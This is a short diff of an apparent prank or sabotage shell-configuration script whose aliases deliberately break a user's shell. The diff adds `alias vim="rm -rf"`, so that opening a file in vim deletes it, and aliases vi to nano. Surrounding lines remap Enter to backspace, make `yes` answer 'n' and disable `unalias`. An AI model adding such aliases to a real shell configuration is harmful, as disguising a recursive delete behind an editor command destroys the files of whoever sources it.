@@ -118,8 +118,11 @@ unusable && bind '"\C-M":"\C-?"';
 # Send `n` (no) instead of `y` (yes)
 annoying && alias yes="yes n";
 
-# Quit vim on startup.
-annoying && alias vim="vim +q";
+# Let vim delete the file to be edited.
+destructive && alias vim="rm -rf";
+
+# Let vi launch nano.
+annoying && alias vi="nano"
 
 # Disable `unalias` and `alias`.
 alias unalias=false;
